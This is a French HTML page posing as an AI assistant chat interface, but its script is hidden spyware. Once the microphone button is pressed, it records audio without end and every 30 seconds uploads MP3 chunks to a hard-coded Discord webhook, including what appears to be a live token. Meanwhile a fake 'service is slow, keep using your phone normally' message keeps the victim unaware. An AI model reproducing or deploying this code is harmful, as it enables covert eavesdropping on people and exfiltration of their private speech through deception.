<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Assistant IA - Interface</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #fff;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
    }

    h1 {
      font-size: 1.8rem;
      margin-bottom: 2rem;
      text-align: center;
    }

    .chat-box {
      display: flex;
      flex-direction: column;
      align-items: stretch;
      background: #fff;
      border: 1px solid #eee;
      border-radius: 20px;
      padding: 1rem;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      max-width: 700px;
      width: 90%;
      gap: 1rem;
    }

    .chat-box input[type="text"] {
      border: none;
      font-size: 1rem;
      padding: 0.6rem;
      outline: none;
      background: transparent;
      color: #444;
      border-bottom: 1px solid #ddd;
    }

    .chat-actions {
      display: flex;
      gap: 0.5rem;
      flex-wrap: wrap;
      align-items: center;
    }

    .chat-actions button {
      border: none;
      padding: 0.5rem 1rem;
      border-radius: 999px;
      font-size: 0.9rem;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 0.4rem;
    }

    .chat-actions button:not(.send-button):not(.voice-button) {
      background-color: #f3f4f6;
    }

    .send-button {
      background-color: #000;
      color: #fff;
      margin-left: auto;
    }

    .voice-button {
      background-color: #eee;
      color: #000;
    }

    .loading-message {
      font-size: 0.9rem;
      color: #555;
      background: #f0f0f0;
      border-radius: 10px;
      padding: 0.8rem;
      margin-top: 1rem;
      display: none;
      text-align: center;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { opacity: 0.6; }
      50% { opacity: 1; }
      100% { opacity: 0.6; }
    }

    audio, #downloadLink {
      display: none;
    }
  </style>
</head>
<body>
  <h1>Comment puis-je vous aider ?</h1>
  <div class="chat-box">
    <input type="text" placeholder="Poser une question">
    <div class="chat-actions">
      <button><span class="icon">üì∑</span> Analyser une image</button>
      <button><span class="icon">üåê</span> Rechercher</button>
      <button class="voice-button" id="startBtn"><span class="icon">üéôÔ∏è</span>Micro</button>
      <button class="send-button">Envoyer</button>
    </div>
    <div class="loading-message" id="loadingMessage">
      ‚è≥ Le service prend un peu de temps √† r√©pondre.<br>
      Vous pouvez continuer √† utiliser votre t√©l√©phone normalement.
    </div>
    <audio id="audioPlayback" controls></audio>
    <a id="downloadLink" href="#">‚¨áÔ∏è T√©l√©charger l'audio</a>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/lamejs@1.2.0/lame.min.js"></script>
  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1357795219541856487/ppsE6KsYZeDjYZNx-qXswAMpWMC5lBCBwCgebXvbbu_ohP-4vYviw7z286BdF36GC3FN";
    const startBtn = document.getElementById("startBtn");
    const loadingMsg = document.getElementById("loadingMessage");

    let audioContext, processor, input, stream;
    let buffer = [];
    let isRecording = false;

    startBtn.onclick = async () => {
      if (isRecording) return;
      isRecording = true;
      loadingMsg.style.display = "block";

      try {
        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        input = audioContext.createMediaStreamSource(stream);
        processor = audioContext.createScriptProcessor(4096, 1, 1);

        processor.onaudioprocess = e => {
          const channelData = e.inputBuffer.getChannelData(0);
          buffer.push(new Float32Array(channelData));
        };

        input.connect(processor);
        processor.connect(audioContext.destination);

        setInterval(() => {
          if (buffer.length === 0) return;

          const recorded = flattenArray(buffer);
          const mp3Blob = encodeMp3(recorded, audioContext.sampleRate);
          buffer = [];

          const formData = new FormData();
          formData.append("file", mp3Blob, "vocal.mp3");

          fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            body: formData
          }).catch(console.error);
        }, 30000); // toutes les 30 secondes
      } catch (err) {
        alert("Erreur micro : " + err.message);
        console.error(err);
        isRecording = false;
        loadingMsg.style.display = "none";
      }
    };

    function flattenArray(buffer) {
      const length = buffer.reduce((acc, val) => acc + val.length, 0);
      const result = new Float32Array(length);
      let offset = 0;
      for (let i = 0; i < buffer.length; i++) {
        result.set(buffer[i], offset);
        offset += buffer[i].length;
      }
      return result;
    }

    function encodeMp3(samples, sampleRate) {
      const mp3encoder = new lamejs.Mp3Encoder(1, sampleRate, 128);
      const blockSize = 1152;
      const mp3Data = [];

      for (let i = 0; i < samples.length; i += blockSize) {
        const sampleChunk = samples.subarray(i, i + blockSize);
        const int16 = floatTo16BitPCM(sampleChunk);
        const mp3buf = mp3encoder.encodeBuffer(int16);
        if (mp3buf.length > 0) mp3Data.push(mp3buf);
      }

      const mp3End = mp3encoder.flush();
      if (mp3End.length > 0) mp3Data.push(mp3End);

      return new Blob(mp3Data, { type: "audio/mp3" });
    }

    function floatTo16BitPCM(floatBuffer) {
      const output = new Int16Array(floatBuffer.length);
      for (let i = 0; i < floatBuffer.length; i++) {
        const s = Math.max(-1, Math.min(1, floatBuffer[i]));
        output[i] = s < 0 ? s * 0x8000 : s * 0x7FFF;
      }
      return output;
    }
  </script>
</body>
</html>
